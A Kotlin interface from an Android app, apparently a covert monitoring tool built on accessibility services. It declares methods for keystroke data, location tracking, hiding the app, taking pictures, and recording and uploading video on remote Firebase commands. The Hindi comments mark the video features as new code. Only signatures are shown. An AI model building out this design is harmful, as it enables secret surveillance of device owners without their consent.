package com.safe.setting.app.services.accessibilityData

import android.location.Location

interface InterfaceAccessibility {

    fun clearDisposable()

    fun setDataKey(data: String)

    fun setDataLocation(location: Location)

    fun getShowOrHideApp()

    fun getCapturePicture()

    // --- नया कोड यहाँ से शुरू होता है ---
    // यह फ़ंक्शन Firebase से वीडियो रिकॉर्डिंग कमांड को सुनेगा।
    fun getCaptureVideo()

    // यह फ़ंक्शन रिकॉर्ड किए गए वीडियो को अपलोड करने के लिए इंटरैक्टर को ट्रिगर करेगा।
    fun handleVideoUpload(filePath: String?)
    // --- नया कोड यहाँ समाप्त होता है ---


    fun setRunServiceData(run: Boolean)

    fun enablePermissionLocation(location: Boolean)

    fun enableGps(gps: Boolean)

    fun startCountDownTimer()

    fun stopCountDownTimer()
}